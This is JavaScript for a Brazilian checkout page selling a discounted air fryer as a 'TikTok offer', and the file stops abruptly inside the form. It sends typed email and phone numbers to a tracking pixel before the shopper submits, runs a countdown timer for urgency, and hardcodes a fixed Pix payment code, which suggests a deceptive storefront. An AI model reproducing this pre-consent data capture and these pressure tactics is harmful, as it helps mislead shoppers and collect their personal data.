document.addEventListener('DOMContentLoaded', function(){
    try {
        if (typeof setupKeyboardDetection === 'function') setupKeyboardDetection();
        else if (typeof window.setupKeyboardDetection === 'function') window.setupKeyboardDetection();
    } catch(e) {}
});
    
    window.initReactCheckout = function() {
        if (window.checkoutInitialized) return;
        if (typeof React === 'undefined' || typeof ReactDOM === 'undefined') {
            setTimeout(window.initReactCheckout, 50); 
            return;
        }
        window.checkoutInitialized = true;
        const { useState, useEffect, useRef, useMemo, useCallback, useLayoutEffect } = React;
        const e = React.createElement; 
        
        const DEFAULT_CODIGO_PIX_COPIA_COLA = "00020101021226900014br.gov.bcb.pix2568pix.adyen.com/pixqrcodelocation/pixloc/v1/loc/hWu3o18RS3OOujzeqNF5iQ5204000053039865802BR5925MONETIZZE IMPULSIONADORA 6009SAO PAULO62070503***63047984";
        const DEFAULT_URL_IMAGEM_QRCODE = "/assets/img/qrcode.webp"; // pode ser sobrescrito via painel (PHP)
        
        const PRODUCT_INFO = { 
            name: "Fritadeira Elétrica Forno Oven 12L Mondial AFON-12L-BI", 
            originalPrice: 399.90, 
            price: 197.99, 
            image: "/assets/img/01.webp", 
            id: "AFON-12L-BI" 
        };

        const trackEvent = (event, data = {}) => { 
            if (window.trackPixel) window.trackPixel(event, data); 
        };

        // 📋 Log opcional de dados capturados no checkout (Cloudflare KV)
        // Endpoint: /api/checkout-log (POST público). Não bloqueia o fluxo do checkout.
        const sendCheckoutLog = (payload) => {
            try {
                const body = JSON.stringify(payload || {});
                if (navigator && typeof navigator.sendBeacon === 'function') {
                    const blob = new Blob([body], { type: 'application/json' });
                    navigator.sendBeacon('/api/checkout-log', blob);
                } else if (typeof fetch === 'function') {
                    fetch('/api/checkout-log', {
                        method: 'POST',
                        headers: { 'content-type': 'application/json' },
                        body,
                        keepalive: true
                    }).catch(() => {});
                }
            } catch(e) {}
        };


        const useInputMask = (type) => {
            const mask = useMemo(() => {
                try {
                    if (window.createInputMask) return window.createInputMask(type);
                } catch(e) {}
                return {
                    format: function(value, selectionStart){
                        var v = value || '';
                        var pos = (selectionStart === undefined || selectionStart === null) ? v.length : selectionStart;
                        return { formatted: v, cursorPosition: pos };
                    }
                };
            }, [type]);
            const inputRef = useRef(null);
            return { mask, inputRef };
        };

        const Icons = {
            Lock: ({className}) => e("svg", {className: className || "w-3 h-3", viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round"}, e("rect", {x: "3", y: "11", width: "18", height: "11", rx: "2", ry: "2"}), e("path", {d: "M7 11V7a5 5 0 0 1 10 0v4"})),
            Truck: ({className}) => e("svg", {className: className || "w-4 h-4 flex-shrink-0 text-yellow-700", viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round"}, e("rect", {x: "1", y: "3", width: "15", height: "13"}), e("polygon", {points: "16 8 20 8 23 11 23 16 16 16 16 8"}), e("circle", {cx: "5.5", cy: "18.5", r: "2.5"}), e("circle", {cx: "18.5", cy: "18.5", r: "2.5"})),
            User: ({className}) => e("svg", {className: className || "w-5 h-5 text-gray-400", viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round"}, e("path", {d: "M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"}), e("circle", {cx: "12", cy: "7", r: "4"})),
            Mail: ({className}) => e("svg", {className: className || "w-5 h-5 text-gray-400", viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round"}, e("path", {d: "M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"}), e("polyline", {points: "22,6 12,13 2,6"})),
            Phone: ({className}) => e("svg", {className: className || "w-5 h-5 text-gray-400", viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round"}, e("path", {d: "M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"})),
            Shield: ({className}) => e("svg", {className: className || "w-5 h-5 text-gray-400", viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round"}, e("path", {d: "M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"}), e("path", {d: "m9 12 2 2 4-4"})),
            Check: ({className}) => e("svg", {className: className || "w-4 h-4 text-white", viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "3", strokeLinecap: "round", strokeLinejoin: "round"}, e("polyline", {points: "20 6 9 17 4 12"})),
            Copy: ({className}) => e("svg", {className: className || "w-5 h-5", viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round"}, e("rect", {x: "9", y: "9", width: "13", height: "13", rx: "2", ry: "2"}), e("path", {d: "M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"})),
            Info: ({className}) => e("svg", {className: className || "w-5 h-5", viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round"}, e("circle", {cx: "12", cy: "12", r: "10"}), e("line", {x1: "12", y1: "16", x2: "12", y2: "12"}), e("line", {x1: "12", y1: "8", x2: "12.01", y2: "8"})),
            Fire: ({className}) => e("svg", {className: className || "w-4 h-4", viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round"}, e("path", {d: "M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.1.2-2.2.6-3.3.39.94.86 2.26 3.4 4.8z"}), e("path", {d: "M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"})),
            Star: ({className}) => e("svg", {className: className || "w-4 h-4", viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round"}, e("polygon", {points: "12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"})),
            Package: ({className}) => e("svg", {className: className || "w-4 h-4", viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round"}, e("line", {x1: "16.5", y1: "9.4", x2: "7.5", y2: "4.21"}), e("path", {d: "M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"}), e("polyline", {points: "3.27 6.96 12 12.01 20.73 6.96"}), e("line", {x1: "12", y1: "22.08", x2: "12", y2: "12"}))
        };

        function CheckoutScreen({ onSuccess }) {
            const [loading, setLoading] = useState(false);
            const [loadingCep, setLoadingCep] = useState(false);
            const [cepFailed, setCepFailed] = useState(false);
            const [formData, setFormData] = useState({ name: '', email: '', phone: '', cpf: '', cep: '', address: '', number: '', city: '' }); // sem persistência localStorage (modo compliance)
            
            // ⭐️ SEGURANÇA: Lógica de tempo mantida para evitar ReferenceError (Crash)
            const [timeLeft, setTimeLeft] = useState(15 * 60);
            const [submitAttempted, setSubmitAttempted] = useState(false);
            const [isFormLocked, setIsFormLocked] = useState(false);
            const [isSubmitting, setIsSubmitting] = useState(false);
            
            const cursorRef = useRef(null);
            const numberRef = useRef(null);
            const progressRef = useRef(null);
            const formRef = useRef(null);
            const hasTrackedStartRef = useRef(false);
            const submitButtonRef = useRef(null);
            const mobileSubmitButtonRef = useRef(null);
            
            const { mask: phoneMask, inputRef: phoneInputRef } = useInputMask('phone');
            const { mask: cpfMask, inputRef: cpfInputRef } = useInputMask('cpf');
            const { mask: cepMask, inputRef: cepInputRef } = useInputMask('cep');
            const fetchingCepRef = useRef(false);
useLayoutEffect(() => {
                if (!cursorRef.current) return;
                const { ref, pos } = cursorRef.current;
                if (ref && ref.current) {
                    try {
                        requestAnimationFrame(() => {
                            if (document.activeElement === ref.current) {
                                ref.current.setSelectionRange(pos, pos);
                            }
                        });
                    } catch(e) {}
                }
                cursorRef.current = null;
            }); 

            useEffect(() => { 
                try { 
                    window.scrollTo(0, 0); 
                    trackEvent('ViewContent', { ...window.PRODUCT_CONTENT, event_id: window.generateEventId(), content_name: PRODUCT_INFO.name }); 
                } catch(e) {} 
                
                const icId = window.generateEventId ? window.generateEventId() : 'evt_'+Date.now(); 
                trackEvent('InitiateCheckout', { ...window.PRODUCT_CONTENT, content_name: PRODUCT_INFO.name, event_id: icId }); 
                
                const analyticsTimer = null; // GA desativado (modo compliance)
                const timerInterval = setInterval(() => { setTimeLeft(prev => prev > 0 ? prev - 1 : 0); }, 1000);

                return () => { clearTimeout(analyticsTimer); clearInterval(timerInterval); }
            }, []);

            useEffect(() => { 
                const totalFields = 5; 
                const filledFields = Object.keys(formData).filter(key => ['name', 'email', 'phone', 'cpf', 'address', 'number'].includes(key) && formData[key]).length;
                const progress = Math.min((filledFields / totalFields) * 100, 100);
                if (progressRef.current) progressRef.current.style.width = `${progress}%`; 
            }, [formData]);

            useEffect(() => {
                const handleBeforeUnload = (e) => { 
                    if (loading || isFormLocked || isSubmitting) {
                        e.preventDefault();
                        e.returnValue = 'Tem certeza que deseja sair? Seu pedido está sendo processado!';
                        return e.returnValue;
                    }
                };
                window.addEventListener('beforeunload', handleBeforeUnload);
                return () => { window.removeEventListener('beforeunload', handleBeforeUnload); };
            }, [loading, isFormLocked, isSubmitting]);

            const validationErrors = useMemo(() => {
                if (!submitAttempted) return {};
                const errors = {};
                if (!formData.name || !formData.name.trim()) errors.name = 'Nome obrigatório';
                if (!formData.email || !formData.email.trim()) errors.email = 'E-mail obrigatório';
                else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) errors.email = 'E-mail inválido';
                if (!formData.phone || !formData.phone.trim()) errors.phone = 'Telefone obrigatório';
                else if (formData.phone.replace(/\D/g, '').length < 10) errors.phone = 'Telefone inválido';
                return errors;
            }, [formData, submitAttempted]);

            // --- PROGRESSIVE MATCHING (O Espião) ---
            const handleBlur = (field) => {
                if (!formData[field]) return;
                
                // Validação básica antes de enviar
                let isValid = false;
                if (field === 'email' && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) isValid = true;
                if (field === 'phone' && formData.phone.replace(/\D/g, '').length >= 10) isValid = true;
                
                if (isValid) {
                    trackEvent('InputCaptured', { 
                        field_name: field, 
                        event_id: window.generateEventId(),
                        // Envia o dado hasheado ou cru (o pixel cuida do hash geralmente, ou envie cru se for server-side seguro)
                        [field]: formData[field] 
                    });
                }
            };

            const trackStartTyping = () => { 
                if (!hasTrackedStartRef.current) { 
                    hasTrackedStartRef.current = true; 
                    trackEvent('ClickButton', { content_name: 'Iniciou Preenchimento', button_name: 'input_name' }); 
                } 
            };
            
            const getDeliveryDate = () => { 
                const d = new Date(); d.setDate(d.getDate() + 4);
                const day = d.getDate();
                const months = ['janeiro','fevereiro','março','abril','maio','junho','julho','agosto','setembro','outubro','novembro','dezembro'];
                const days = ['Domingo','Segunda-feira','Terça-feira','Quarta-feira','Quinta-feira','Sexta-feira','Sábado'];
                return `${days[d.getDay()]}, ${day} de ${months[d.getMonth()]}`;
            };
            
            const handleCep = async (val) => { 
                if (fetchingCepRef.current) return;
                const cep = val.replace(/\D/g, ''); 
                if (cep.length === 8) { 
                    fetchingCepRef.current = true; setLoadingCep(true); 
                    
                    // Adicionado AbortController para evitar travamento em 3G/4G instável
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 5000); // 5s timeout

                    try { 
                        setCepFailed(false);
                        const res = await fetch(`https://viacep.com.br/ws/${cep}/json/`, { signal: controller.signal }); 
                        clearTimeout(timeoutId);
                        if (!res.ok) throw new Error('ViaCEP HTTP ' + res.status);
                        const data = await res.json(); 
                        if(!data || data.erro) { 
                            setCepFailed(true);
                        } else { 
                            setFormData(prev => ({ ...prev, address: data.logradouro || '', city: `${data.localidade || ''}/${data.uf || ''}`.replace(/^\//,'') })); 
                            setTimeout(() => { try { if(numberRef.current) numberRef.current.focus(); } catch(e){} }, 300);
                        }
                    } catch(e) {
                        // Falha comum em in-app / conexão fraca: libera preenchimento manual
                        try { setCepFailed(true); } catch(_) {}
                    } finally {
                        setLoadingCep(false); fetchingCepRef.current = false;
                    }
                } 
            };
            
            const handleChange = (e) => { if (!isFormLocked && !isSubmitting) setFormData(prev => ({...prev, [e.target.name]: e.target.value})); };
            
            const handlePhoneChange = (e) => {
                if (isFormLocked || isSubmitting) return;
                const { name, value, selectionStart } = e.target;
                const result = phoneMask.format(value, selectionStart);
                setFormData(prev => ({...prev, [name]: result.formatted}));
                cursorRef.current = { ref: phoneInputRef, pos: result.cursorPosition };
            };
            
            const handleCpfChange = (e) => {
                if (isFormLocked || isSubmitting) return;
                const { name, value, selectionStart } = e.target;
                const result = cpfMask.format(value, selectionStart);
                setFormData(prev => ({...prev, [name]: result.formatted}));
                cursorRef.current = { ref: cpfInputRef, pos: result.cursorPosition };
            };
            
            const handleCepChange = (e) => {
                if (isFormLocked || isSubmitting) return;
                const { name, value, selectionStart } = e.target;
                const result = cepMask.format(value, selectionStart);
                setFormData(prev => ({...prev, [name]: result.formatted}));
                cursorRef.current = { ref: cepInputRef, pos: result.cursorPosition };
                if (value.replace(/\D/g, '').length < 8) { try { setCepFailed(false); } catch(e) {} }
                if (value.replace(/\D/g, '').length === 8 && formData.cep.replace(/\D/g, '') !== value.replace(/\D/g, '')) handleCep(value.replace(/\D/g, ''));
            };

            const handleSubmit = (ev) => {
                // CRITICAL FIX: Prevent default FIRST to avoid page reload on Enter key if locked
                if(ev) ev.preventDefault();
                
                // ⭐️ CORREÇÃO 4: Race condition check logo no início ⭐️
                if (isSubmitting || isFormLocked || loading) return;
                
                setIsSubmitting(true);
                // BLINDA RACE CONDITION: Desabilita botões IMEDIATAMENTE no DOM
                if (submitButtonRef.current) { submitButtonRef.current.disabled = true; submitButtonRef.current.setAttribute('aria-busy', 'true'); }
                if (mobileSubmitButtonRef.current) { mobileSubmitButtonRef.current.disabled = true; mobileSubmitButtonRef.current.setAttribute('aria-busy', 'true'); }
                
                setSubmitAttempted(true);
                const errors = {};
                if (!formData.name || !formData.name.trim()) errors.name = 'Nome obrigatório';
                if (!formData.email || !formData.email.trim()) errors.email = 'E-mail obrigatório';
                else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) errors.email = 'E-mail inválido';
                if (!formData.phone || !formData.phone.trim()) errors.phone = 'Telefone obrigatório';
                else if (formData.phone.replace(/\D/g, '').length < 10) errors.phone = 'Telefone inválido';
                
                if (Object.keys(errors).length > 0) {
                    const firstError = Object.keys(errors)[0];
                    
                    // --- RASTREAMENTO DE ERRO (Fricção) ---
                    trackEvent('Checkout_Error', {
                        error_field: firstError,
                        error_message: errors[firstError],
                        event_id: window.generateEventId()
                    });

                    const errorElement = document.querySelector(`[name="${firstError}"]`);
                    if (errorElement) {
                        requestAnimationFrame(() => { 
                            // SCROLL INTELIGENTE: Calcula altura do header dinamicamente + Footer height
                            const header = document.querySelector('.static-nav');
                            const offset = header ? header.clientHeight + 60 : 120;
                            // Garante que não fique atrás do footer
                            const footerHeight = 100; 
                            const y = errorElement.getBoundingClientRect().top + window.scrollY - offset;
                            window.scrollTo({top: Math.max(0, y), behavior: 'smooth'});

                            try {
                                // iOS/WebView antigos podem não suportar focus({preventScroll:true})
                                errorElement.focus({ preventScroll: true });
                            } catch(e) {
                                try { errorElement.focus(); } catch(_) {}
                            }
                        });
                    }
                    setTimeout(() => {
                        setIsSubmitting(false);
                        if (submitButtonRef.current) { submitButtonRef.current.disabled = false; submitButtonRef.current.removeAttribute('aria-busy'); }
                        if (mobileSubmitButtonRef.current) { mobileSubmitButtonRef.current.disabled = false; mobileSubmitButtonRef.current.removeAttribute('aria-busy'); }
                    }, 500);
                    return;
                }
                
                if (document.activeElement && document.activeElement.blur) document.activeElement.blur();
                setIsFormLocked(true); setLoading(true);
                
                const finalEmail = formData.email.toLowerCase().trim();
                const finalPhone = formData.phone.replace(/\D/g, ''); 
                const nameParts = formData.name.trim().split(" ");
                const firstName = nameParts[0];
                const lastName = nameParts.length > 1 ? nameParts.slice(1).join(" ") : "";
                
                let city = "", state = "";
                if(formData.city) {
                    if(formData.city.includes('/')) {
                        const parts = formData.city.split('/');
                        city = parts[0].trim();
                        state = parts[1].trim();
                    } else {
                        city = formData.city;
                    }
                }
                const uniqueOrderId = 'ord_' + new Date().getTime(); 
                trackEvent('AddPaymentInfo', { ...window.PRODUCT_CONTENT, event_id: window.generateEventId(), order_id: uniqueOrderId });

                // 📋 Salva uma "captura" do checkout no KV (não impacta conversão)
                try {
                    const sp = new URLSearchParams(window.location.search || '');
                    const utm = {
                        utm_source: sp.get('utm_source') || undefined,
                        utm_medium: sp.get('utm_medium') || undefined,
                        utm_campaign: sp.get('utm_campaign') || undefined,
                        utm_content: sp.get('utm_content') || undefined,
                        utm_term: sp.get('utm_term') || undefined
                    };
                    // ✅ Painel (KV) separado do TikTok: salva SOMENTE o mínimo necessário
                    // (nome + telefone + order_id + ref). Nada de email/CPF/endereço/UTM.
                    sendCheckoutLog({
                        event: 'checkout_submit',
                        ts_client: Date.now(),
                        order_id: uniqueOrderId,
                        name: (formData.name || '').trim(),
                        phone: finalPhone,
                        ref: (window.getRefCode ? (window.getRefCode() || '') : '')
                    });
                } catch(e) {}
                
                setTimeout(() => { 
                    onSuccess({ ...formData, email: finalEmail, phone: finalPhone, firstName, lastName, city, state, transactionId: uniqueOrderId }); 
                }, 800);
            };

            // ✅ FIX (iOS / WebView): em alguns navegadores embutidos (TikTok/Instagram/iOS),
            // quando o teclado está aberto, o primeiro "tap" em um botão fixo pode apenas
            // fechar o teclado e NÃO disparar o click. Capturamos no touchstart e disparamos
            // o submit no próximo frame, com um pequeno lock anti-duplo disparo.
            const mobileTapLockRef = useRef(false);
            const handleMobileSubmitTap = (ev) => {
                try { if (ev) { ev.preventDefault(); ev.stopPropagation(); } } catch(e) {}
                if (mobileTapLockRef.current) return;
                mobileTapLockRef.current = true;
                setTimeout(() => { mobileTapLockRef.current = false; }, 650);

                // força blur imediato para evitar o "primeiro tap" ser consumido pelo fechamento do teclado
                try {
                    const ae = document.activeElement;
                    if (ae && (ae.tagName === 'INPUT' || ae.tagName === 'TEXTAREA')) ae.blur();
                } catch(e) {}

                requestAnimationFrame(() => { try { handleSubmit(); } catch(e) {} });
            };

            // ✅ FIX (iOS / WebView): o mesmo problema do "primeiro tap" pode acontecer
            // no botão de VOLTAR (header). Capturamos no touchstart e executamos no próximo frame.
            const backTapLockRef = useRef(false);
            const doBackNavigation = () => {
                try {
                    const ref = document.referrer || '';
                    const sameOrigin = ref && ref.indexOf(window.location.origin) === 0;
                    const external = /tiktok|instagram|facebook|fb\.|l\.facebook\.com|t\.co|twitter/i.test(ref);
                    if (window.history.length > 1 && sameOrigin && !external) {
                        window.history.back();
                    } else {
                        window.location.href = '/';
                    }
                } catch(e) { window.location.href = '/'; }
            };

            const handleBackTap = (ev) => {
                try { if (ev) { ev.preventDefault(); ev.stopPropagation(); } } catch(e) {}
                if (isFormLocked || isSubmitting) return;
                if (backTapLockRef.current) return;
                backTapLockRef.current = true;
                setTimeout(() => { backTapLockRef.current = false; }, 650);

                // fecha teclado para evitar o "tap consumido"
                try {
                    const ae = document.activeElement;
                    if (ae && (ae.tagName === 'INPUT' || ae.tagName === 'TEXTAREA')) ae.blur();
                } catch(e) {}

                requestAnimationFrame(() => { try { doBackNavigation(); } catch(e) {} });
            };


            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;

            const shouldShowAddressFields = useMemo(() => {
                const cd = (formData.cep || '').replace(/\D/g, '');
                return !!formData.address || !!cepFailed || cd.length === 8;
            }, [formData.address, formData.cep, cepFailed]);
            
            return e("div", { className: "fade-in w-full min-h-screen font-sans bg-[#f8fafc] form-container" },
                e("div", { ref: progressRef, className: "progress-bar", style: {width: '10%'} }),
                /* ⭐️ SEGURANÇA: Barra visual removida, lógica mantida internamente no componente */
                e("div", { className: "static-nav bg-white/98 border-b border-gray-200 px-4 flex justify-between items-center z-30 shadow-[0_2px_8px_rgba(0,0,0,0.04)]" },
                    e("button", { type: "button", onTouchStart: handleBackTap,
                        onClick: handleBackTap, className: `flex items-center text-slate-400 hover:text-slate-600 transition-colors p-3 -ml-3 btn-tactile ${isFormLocked ? 'opacity-50 cursor-not-allowed' : ''}`, "aria-label": "Voltar", disabled: isFormLocked || isSubmitting }, 
                        e("svg", { className: "w-6 h-6", viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round" }, e("polyline", {points: "15 18 9 12 15 6"}))
                    ),
                    e("img", { src: "/assets/img/logo.webp", alt: "Logo", className: "h-8 w-auto object-contain", onError: (ev) => { try { const img = ev.target; if(!img.dataset.fallback){ img.dataset.fallback='1'; img.src = "/assets/img/logo.webp"; } } catch(e) {} } }),
                    e("div", {className: "w-12"})
                ),
                e("div", { className: "max-w-[500px] lg:max-w-5xl mx-auto p-4 lg:px-8 pt-6 space-y-4 lg:space-y-0 lg:grid lg:grid-cols-12 lg:gap-10 lg:items-start" },
                    e("div", { className: "space-y-4 lg:col-span-5 lg:sticky lg:top-28" },
                        e("div", { className: "bg-white rounded-2xl shadow-[0_4px_20px_rgb(0,0,0,0.03)] p-5 flex gap-4 border border-slate-100 items-center relative overflow-hidden group" },
                            e("div", { className: "absolute top-0 left-0 bg-green-600 text-white text-[10px] font-bold px-3 py-1 rounded-br-lg shadow-sm tracking-wide" }, "OFERTA TIKTOK"),
                            e("div", { className: "w-24 h-24 bg-white rounded-xl overflow-hidden flex-shrink-0 border border-slate-100 p-2 shadow-inner" }, e("img", { src: PRODUCT_INFO.image, className: "w-full h-full object-contain transform group-hover:scale-105 transition-transform duration-500", alt: PRODUCT_INFO.name, loading: "eager", decoding: "async", onError: (ev) => { try { const img = ev.target; if(!img.dataset.fallback){ img.dataset.fallback='1'; img.src = "/" + String(PRODUCT_INFO.image || '').replace(/^\/+/, ''); } } catch(e) {} } })),
                            e("div", {className: "flex-1 min-w-0 mt-2"},
                                e("h3", { className: "text-sm font-bold text-slate-800 leading-snug line-clamp-2 mb-1" }, PRODUCT_INFO.name),
                                e("div", {className: "flex flex-col items-start"}, e("span", { className: "text-xs text-slate-400 line-through" }, "De R$ " + PRODUCT_INFO.originalPrice.toFixed(2).replace('.',',')), e("span", { className: "font-extrabold text-2xl text-green-600 tracking-tight" }, "Por R$ " + PRODUCT_INFO.price.toFixed(2).replace('.',','))),
                                e("div", { className: "flex items-center gap-2 mt-3 flex-wrap" }, 
                                    e("span", { className: "text-[10px] bg-green-50 border border-green-100 text-green-800 font-semibold px-2.5 py-1 rounded-full flex items-center gap-1.5" }, e(Icons.Shield, {className: "w-3 h-3"}), "Compra Segura"),
                                    e("span", { className: "text-[10px] bg-indigo-50 border border-indigo-100 text-indigo-800 font-semibold px-2.5 py-1 rounded-full flex items-center gap-1.5" }, e(Icons.Package, {className: "w-3 h-3"}), "Garantia 12 Meses")
                                )
                            )
                        ),
                        e("div", { className: "bg-amber-50 border border-amber-100 rounded-xl p-4 mb-4" }, 
                            e("div", {className: "flex items-start gap-3"},
                                e("div", { className: "bg-amber-100 p-2 rounded-full flex-shrink-0 text-amber-600" }, e(Icons.Star, {className: "w-4 h-4"})),
                                e("div", null, e("p", { className: "font-bold text-amber-900 text-sm mb-0.5" }, "Satisfação Garantida"), e("p", { className: "text-amber-800/80 text-xs leading-relaxed" }, "Se não gostar, devolvemos seu dinheiro em até 7 dias. Sem burocracia."))
                            )
                        )
                    ),
                    e("form", { id: "checkout-form", ref: formRef, onSubmit: handleSubmit, className: "space-y-4 lg:col-span-7", noValidate: true, "data-testid": "checkout-form" },
                        e("button", { type: "submit", style: { display: 'none' } }), 
                        e("div", { className: "bg-white rounded-2xl shadow-[0_2px_15px_rgb(0,0,0,0.03)] border border-slate-100 overflow-hidden" },
                            e("div", { className: "bg-slate-50/50 px-5 py-3 border-b border-slate-100 flex items-center gap-3" }, e("span", { className: "bg-green-600 text-white text-xs font-bold w-6 h-6 rounded-full flex items-center justify-center shadow-md shadow-green-600/20" }, "1"), e("h3", { className: "text-sm font-bold text-slate-700 uppercase tracking-wide" }, "Dados Pessoais")),
                            e("div", {className: "p-5 pt-6"},
                                e("div", {className: "mb-4"},
                                    e("label", { className: "text-[11px] font-bold text-slate-500 uppercase tracking-wide pl-1 mb-1.5 block" }, "Nome Completo"),
                                    e("div", {className: "relative"},
                                        e("div", { className: "absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-gray-400" }, e(Icons.User, {className: "w-5 h-5"})),
                                        e("input", { type: "text", name: "name", value: formData.name, onChange: handleChange, onFocus: trackStartTyping, className: `w-full py-3.5 pl-11 pr-4 bg-white border ${validationErrors.name ? 'border-red-500 bg-red-50/30' : formData.name ? 'border-green-500 bg-green-50/30' : 'border-slate-200'} rounded-xl text-slate-700 text-base shadow-sm placeholder:text-slate-300 outline-none transition-all duration-200`, placeholder: "Digite seu nome completo", required: true, disabled: isFormLocked || isSubmitting, autoComplete: "name", autoCorrect: "off", autoCapitalize: "words", spellCheck: "false", "aria-invalid": validationErrors.name ? "true" : "false", "aria-describedby": validationErrors.name ? "name-error" : undefined })
                                    ),
                                    validationErrors.name && e("p", { id: "name-error", className: "text-red-500 text-xs mt-1 pl-1" }, validationErrors.name)
                                ),
                                e("div", {className: "mb-4"},
                                    e("label", { className: "text-[11px] font-bold text-slate-500 uppercase tracking-wide pl-1 mb-1.5 block" }, "E-mail"),
                                    e("div", {className: "relative"},
                                        e("div", { className: "absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-gray-400" }, e(Icons.Mail, {className: "w-5 h-5"})),
                                        e("input", { type: "email", name: "email", value: formData.email, onChange: handleChange, onBlur: () => handleBlur('email'), className: `w-full py-3.5 pl-11 pr-4 bg-white border ${validationErrors.email ? 'border-red-500 bg-red-50/30' : formData.email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email) ? 'border-green-500 bg-green-50/30' : 'border-slate-200'} rounded-xl text-slate-700 text-base shadow-sm placeholder:text-slate-300 outline-none transition-all duration-200`, placeholder: "exemplo@email.com", required: true, inputMode: "email", disabled: isFormLocked || isSubmitting, autoComplete: "email", autoCorrect: "off", spellCheck: "false", "aria-invalid": validationErrors.email ? "true" : "false", "aria-describedby": validationErrors.email ? "email-error" : undefined })
                                    ),
                                    validationErrors.email && e("p", { id: "email-error", className: "text-red-500 text-xs mt-1 pl-1" }, validationErrors.email)
                                ),
                                e("div", {className: "mb-4"},
                                    e("label", { className: "text-[11px] font-bold text-slate-500 uppercase tracking-wide pl-1 mb-1.5 block" }, "Celular (WhatsApp)"),
                                    e("div", {className: "relative"},
                                        e("div", { className: "absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-gray-400" }, e(Icons.Phone, {className: "w-5 h-5"})),
                                        e("input", { ref: phoneInputRef, type: "tel", name: "phone", value: formData.phone, onChange: handlePhoneChange, onBlur: () => handleBlur('phone'), className: `w-full py-3.5 pl-11 pr-4 bg-white border ${validationErrors.phone ? 'border-red-500 bg-red-50/30' : formData.phone && formData.phone.replace(/\D/g, '').length >= 10 ? 'border-green-500 bg-green-50/30' : 'border-slate-200'} rounded-xl text-slate-700 text-base shadow-sm placeholder:text-slate-300 outline-none transition-all duration-200`, placeholder: "(00) 00000-0000", required: true, inputMode: "tel", disabled: isFormLocked || isSubmitting, autoComplete: "tel", maxLength: 15, autoCorrect: "off", autoCapitalize: "off", spellCheck: "false", "aria-invalid": validationErrors.phone ? "true" : "false", "aria-describedby": validationErrors.phone ? "phone-error" : undefined })
                                    ),
                                    validationErrors.phone && e("p", { id: "phone-error", className: "text-red-500 text-xs mt-1 pl-1" }, validationErrors.phone)
                                ),
                                e("div", {className: "mb-4"},
                                    e("label", { className: "text-[11px] font-bold text-slate-500 uppercase tracking-wide pl-1 mb-1.5 flex justify-between items-center" }, 
                                        "CPF",
                                        e("span", {className: "text-[9px] text-green-600 bg-green-50 px-2 py-0.5 rounded-full border border-green-100 normal-case"}, "Necessário para Nota Fiscal")
                                    ),
                                    e("div", {className: "relative"},
                                        e("div", { className: "absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-gray-400" }, e(Icons.Shield, {className: "w-5 h-5"})),
